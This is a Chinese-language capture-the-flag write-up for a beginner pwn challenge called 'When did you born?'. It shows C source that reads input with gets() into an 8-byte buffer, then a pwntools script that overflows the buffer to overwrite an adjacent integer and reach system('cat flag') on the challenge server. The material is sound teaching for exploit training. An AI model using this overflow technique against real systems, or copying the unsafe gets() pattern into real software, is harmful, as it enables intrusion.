1.url:https://cgctf.nuptsast.com/challenges#Pwn 
题目名称：When did you born？
题目提示：
远程入口：nc ctf.acdxvfsvd.net 1926

Try not to be naive

tip: gets，栈溢出

提取密码：dwvg
<h3>案例分析</h3>
<br>查看源代码：<br>
<code>
#include <stdio.h>

struct Student {
    char name[8];
    int birth;
};

int main(void) {
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
    struct Student student;
    printf("What\'s Your Birth?\n");
    scanf("%d", &student.birth);
    while (getchar() != '\n') ;
    if (student.birth == 1926) {
        printf("You Cannot Born In 1926!\n");
        return 0;
    }
    printf("What\'s Your Name?\n");
    gets(student.name);
    printf("You Are Born In %d\n", student.birth);
    if (student.birth == 1926) {
        printf("You Shall Have Flag.\n");
        system("cat flag");
    } else {
        printf("You Are Naive.\n");
        printf("You Speed One Second Here.\n");
    }
    return 0;
}
</code><br>

分析代码看到函数gets 这里提示已经很明显了 ，给出了student的构造函数，name为8位，要覆盖birth得到flag,所以需要构造payload如下;
<br><code>from pwn import  *  
n = remote("ctf.acdxvfsvd.net",1926)  
payload = 'a'*8 + p32(1926)        
n.recvuntil("What\'s Your Birth?\n")  
n.sendline("2333")   
n.recvuntil("What\'s Your Name?\n")
n.sendline(payload)   
n.interactive()
</code><br>
其中函数p32主要是对整数进行打包，就是转换成二进制的形式，比如转换成地址。p32、p64是打包，u32、u64是解包
最后得到flag
